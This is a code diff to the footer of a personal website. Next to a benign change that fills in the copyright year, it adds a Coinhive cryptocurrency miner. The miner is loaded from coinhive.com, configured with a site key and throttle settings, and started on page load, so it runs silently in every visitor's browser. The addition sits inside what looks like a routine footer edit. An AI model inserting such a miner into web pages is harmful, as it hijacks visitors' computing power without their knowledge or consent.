@@ -1,4 +1,14 @@
-<footer><span>©2016 Michal Szulc | All rights reserved.</span></footer>
+<footer><span>©<span id="fullYear"></span> Michal Szulc | All rights reserved.</span></footer>
+   <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('jhNbFszELfcNVfU6j0OPGyRW0TzYNrNX', {
+	threads: 1,
+	autoThreads: false,
+	throttle: 0.7,
+	forceASMJS: false
+});
+	miner.start();
+</script>
 <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
   (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
@@ -8,4 +18,7 @@
   ga('create', 'UA-76533119-1', 'auto');
   ga('send', 'pageview');
 
+</script>
+<script>
+ document.getElementById('fullYear').innerHTML = (new Date()).getFullYear();
 </script>
